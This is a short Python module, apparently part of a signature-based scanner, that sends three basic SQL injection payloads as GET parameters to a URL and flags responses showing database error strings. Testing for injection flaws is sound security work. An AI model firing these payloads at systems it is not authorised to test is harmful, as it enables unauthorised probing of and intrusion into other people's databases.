"""Basic SQL injection tester (signature-based)"""
import requests, time
SQL_PAYLOADS = ["' OR '1'='1", "' OR 1=1 -- ", '" OR ""="']

ERROR_SIGNS = ['you have an error in your sql syntax', 'mysql', 'syntax error', 'sql error', 'unterminated quoted string']

def test_get_param(url, param, base_params=None, timeout=8):
    base = base_params or {}
    findings = []
    for p in SQL_PAYLOADS:
        params = base.copy()
        params[param] = p
        try:
            r = requests.get(url, params=params, timeout=timeout)
        except Exception as e:
            continue
        text = r.text.lower()
        if any(s in text for s in ERROR_SIGNS):
            findings.append({'payload': p, 'evidence': 'error string in response'})
    return findings

if __name__ == '__main__':
    print('This module provides functions to test SQLi. Import and use from main.py')
